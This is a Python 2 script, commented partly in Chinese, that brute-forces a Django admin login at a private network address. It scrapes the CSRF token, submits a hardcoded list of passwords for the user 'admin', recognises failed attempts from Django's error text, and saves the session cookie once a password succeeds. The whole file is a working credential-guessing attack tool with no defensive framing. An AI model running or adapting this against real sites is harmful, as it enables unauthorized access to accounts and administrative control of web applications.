#!/usr/bin/python
#coding=utf8
#filename:web_auth_cookie_django2.py
"""
20130716-1500 http://192.168.1.214:8000/admin/
Python3 urllib 实例
http://www.itwhy.org/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/python/python3-urllib-%E5%AE%9E%E4%BE%8B.html
"""
import urllib
import urllib2
import cookielib
import time

class CookieAuthCrack():
    url11 = "http://192.168.192.214:8000/admin/"
    url_pre = "http://192.168.192.214:8000/blog/add/"
    url_pre2 = "http://192.168.192.214:8000/admin/auth/user/1/"
    cookie_file11 = "/tmp/cookie11.txt"
    agent11 = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
    user11 = "admin"
    pwd11 = ['admin2', 'aaa', 'bbb', 'admin','ssdssw','scbh001', 'admin3']
    csrfM = ""
    def __init__(self, user_agent=None):
        if not user_agent:
            user_agent = self.agent11
        self.ckjar = cookielib.MozillaCookieJar(self.cookie_file11)
        self.ckprc = urllib2.HTTPCookieProcessor(self.ckjar)
        self.opener = urllib2.build_opener(self.ckprc)
        self.client_headers = ('User-Agent', user_agent)
        self.opener.addheaders = [self.client_headers]

    def add_cookie(self):
        self.ckjar = cookielib.MozillaCookieJar(self.cookie_file11)
        self.opener.add_handler(urllib2.HTTPCookieProcessor(self.ckjar))

    def read_url(self, url, charset='utf-8'):
        try:
            response = urllib2.urlopen(url)
        except urllib2.HTTPError, e:
            print "at urllib2.urlopen, raise ERROR (", e, ")"
            return
        tmp = response.read()
        return tmp

    def read_url_with_cookie(self, url=None):
        if not url:
            return
        try:
            req = urllib2.Request(url)
            response = self.opener.open(req)
        except urllib2.HTTPError, e:
            print "opener.open(), raise ERROR (", e, ")"
            return
        tmp = response.read()
        return tmp

    def get_csrf(self, response=None):
        if not response:
            return
        index = response.find('csrfmiddlewaretoken')
        tmp2 = response[index:index+60]
        self.csrfM = tmp2.split("'")[2]
        return self.csrfM

    def load_cookie_from_file(self, filename=None):
        if not filename:
            self.ckjar.load()
        else:
            self.ckjar.filename = filename
            self.ckjar.load()

    def crack(self, url=None, username=None, *pwd_list):
        if not url:
            url = self.url11
        if not pwd_list:
            pwd_list = self.pwd11
        if not username:
            username = self.user11

        if not self.csrfM:
            self.get_csrf(self.read_url_with_cookie(url))

        for key1 in pwd_list:
            pwd_encode = urllib.urlencode({
                    'username': username,
                    'password': key1,
                    'this_is_the_login_form': 1,
                    'next': '/admin/',
                    'csrfmiddlewaretoken': self.csrfM,
                    })
            try:
                req = urllib2.Request(url)
                response = self.opener.open(req, pwd_encode)
            except urllib2.HTTPError, e:
                print "at opener.open, raise ERROR (", e, ") "
                return
            response_resu = response.getcode()
            if response_resu == 200:
                response_html = response.read()
                #怎么样判断是通过验证，标志是***用户登陆失败***
                case = response_html.find('Please enter the correct')
                if case != -1:
                    # #for debug
                    # print "false(%s)DEBUG" %( key1 )
                    # print self.get_csrf(response_html)
                    # print self.ckjar
                    continue
                else:
                    print "Find the key(%s), %s" % (key1, time.ctime())
                    self.ckjar.save()
                    return key1
        return

if __name__ == "__main__":
    s11 = CookieAuthCrack()
    pwd = s11.crack()
    print "pwd(%s)" % (pwd)
